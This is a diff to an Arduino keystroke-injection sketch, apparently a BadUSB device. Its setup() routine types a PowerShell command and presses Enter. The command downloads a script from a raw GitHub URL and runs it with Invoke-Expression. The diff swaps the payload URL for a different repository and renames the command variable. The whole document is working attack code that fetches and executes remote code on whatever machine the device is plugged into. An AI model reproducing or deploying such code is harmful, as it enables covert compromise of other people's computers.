@@ -7,7 +7,7 @@ $command_to_run = @"
         try {
             Test-Connection github.com -Count 1 -ErrorAction Stop;
             Invoke-Expression (
-                Invoke-WebRequest -Uri https://raw.githubusercontent.com/Desezutt/pupupu/main/n.txt -UseBasicParsing
+                Invoke-WebRequest -Uri https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/main -UseBasicParsing
                 | Select-Object -ExpandProperty Content
             );
             break
@@ -58,7 +58,7 @@ void setup() {
     delay(1500);
 
     // Download and Run PowerShell Script
-    Keyboard.print(COMMAND);
+    Keyboard.print(command);
     Keyboard.write(KEY_RETURN); 
 }
 
